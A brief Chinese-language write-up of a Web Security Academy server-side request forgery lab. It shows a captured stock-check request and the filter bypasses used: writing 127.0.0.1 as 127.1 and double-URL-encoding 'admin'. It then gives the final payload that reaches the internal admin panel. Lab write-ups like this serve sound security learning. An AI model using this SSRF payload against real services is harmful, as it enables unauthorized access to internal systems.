一道SSRF题目，让我对SSRF攻击有了更深的理解，

感觉ssrf就是绕过外面的限制，直接走内部请求来获取信息

发现在stock的页面中有一个奇怪的请求

```
POST /product/stock HTTP/2
Host: 0a76004a032a5060807658cc009400c1.web-security-academy.net
Cookie: session=9bwUTzb5deghei87BHnSZR52ndQTaJAg
Content-Length: 107
Sec-Ch-Ua: 
Sec-Ch-Ua-Platform: ""
Sec-Ch-Ua-Mobile: ?0
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.5735.110 Safari/537.36
Content-Type: application/x-www-form-urlencoded
Accept: */*
Origin: https://0a76004a032a5060807658cc009400c1.web-security-academy.net
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: cors
Sec-Fetch-Dest: empty
Referer: https://0a76004a032a5060807658cc009400c1.web-security-academy.net/product?productId=1
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9

stockApi=http%3A%2F%2Fstock.weliketoshop.net%3A8080%2Fproduct%2Fstock%2Fcheck%3FproductId%3D1%26storeId%3D1
```

这里请求了stockApi来获取信息，

我们伪造一个127.0.0.1/admin来实现内网的请求从而获取权限

但是过滤了.0和admin

127.0.0.1==127.1可以绕过一层过滤

admin可以采用双重url编码的方式绕过

```
在 SQL 注入攻击中，双层 URL 编码绕过机制是一种黑客利用 URL 编码的漏洞绕过安全检查的手法。原始的 URL 编码是将特殊字符转换成 % 后面跟着它的 ASCII 值的十六进制表示。例如，' 被编码为 %27，" 被编码为 %22。

然而，某些 Web 应用程序在接收到 URL 编码值时，会自动对它进行解码，然后再进行一次处理。这意味着攻击者可以使用双层 URL 编码来绕过输入过滤和验证机制。

攻击者可以首先将攻击字符串进行一次 URL 编码，然后将编码后的值再次进行 URL 编码。这样，第一层的编码将被解码，然后第二层的编码也将被解码。这样做的目的是让关键的特殊字符在第二次解码时恢复成原始状态。
```

主要是某些Web会自动解码，感觉全靠尝试

然后即可构造payload

```
stockApi=http://127.1/%25%36%31%25%36%34%25%36%64%25%36%39%25%36%65
```

然后实现了越权